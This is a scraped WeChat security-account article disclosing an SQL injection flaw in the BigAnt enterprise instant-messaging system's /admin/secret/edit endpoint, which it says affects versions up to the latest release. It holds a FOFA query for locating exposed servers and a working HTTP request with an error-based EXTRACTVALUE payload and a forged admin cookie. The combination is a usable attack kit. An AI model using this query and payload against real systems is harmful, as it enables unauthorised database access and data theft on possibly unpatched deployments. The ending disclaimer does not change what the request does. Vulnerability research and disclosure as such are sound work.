---
title: 大蚂蚁 (BigAnt) 即时通讯系统 admin/secret/edit SQL注入漏洞
url: https://mp.weixin.qq.com/s/r_n49od3-Ts09Fcn0m6Geg
source: Doonsec's feed
date: 2026-06-17
fetch_date: 2026-06-18T06:47:16.763238
---

# 大蚂蚁 (BigAnt) 即时通讯系统 admin/secret/edit SQL注入漏洞

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/ZrTsB3aQgWD5P1kaqnjTPiap0X0icfKxaMPkw86j73cs6t4dzUwcLzMEvY4wibVgdTDMJUeFGibpuXyuk0v2fCuGpFibRkUpUP43Kf8eReoCNEaA/0?wx_fmt=jpeg)

# 大蚂蚁 (BigAnt) 即时通讯系统 admin/secret/edit SQL注入漏洞

0day收割机

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 漏洞简介

大蚂蚁 (BigAnt) 即时通讯系统是一款企业级IM通信管理系统，提供多种功能支持。该系统的 \Admin\Controller\SecretController::edit 接口存在SQL注入漏洞，攻击者可通过在 updateLoginName 功能的相关参数中插入恶意构造的 SQL 查询语句，实现对后端数据库的非法操作，可能导致敏感信息泄露、数据篡改、绕过身份验证，甚至在特定配置下实现任意命令执行或获取系统控制权限。

# 影响版本

BigAnt 5.5.x 及以上版本用户

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWDuFbw1NkzUQwBpbt2hX2KcuLn2JibrsollFFha6cw8h1c6bW39z3TJOBXt9MAOriacvj60tNqGAsGW1l9TrhRXiahWW1eIDlgOpc/640?wx_fmt=png&from=appmsg)

经过测试，最新版本 6.0.1.20250407.1 也受影响

# fofa语法

> (body="/Public/static/admin/admin\_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"

# 漏洞复现

```
GET /admin/secret/edit?app_id=pc_client&sec_level={{url(1' AND EXTRACTVALUE(1, CONCAT(0x7e, user(), 0x7e)) and '1'='1)}} HTTP/1.1
Host:
Cookie: userId=admin;saasId=bigant
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```

![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWAHnyFWq7PxmTD5fkwC5Qt5iacicQknGq2ALuloKypY1lxY4Jk5eOqmawDGrmsuzSVoxNwFJM4ltpDURw2IukYGicdANFaD4UOX5E/640?wx_fmt=png&from=appmsg)

因为系统配置原因，不存在`antdbms.hs_secret`表，但是漏洞是真实存在的。

仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/MtjOicQLUtFg3CRl5wFA4loxN8krcYMpuzNjcVibkricNCB4GC9k3ib6UQLsf2RIuOcJFHT568lSjAqz8ze0oMAgxw/0?wx_fmt=png)

0day收割机

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/MtjOicQLUtFg3CRl5wFA4loxN8krcYMpuzNjcVibkricNCB4GC9k3ib6UQLsf2RIuOcJFHT568lSjAqz8ze0oMAgxw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过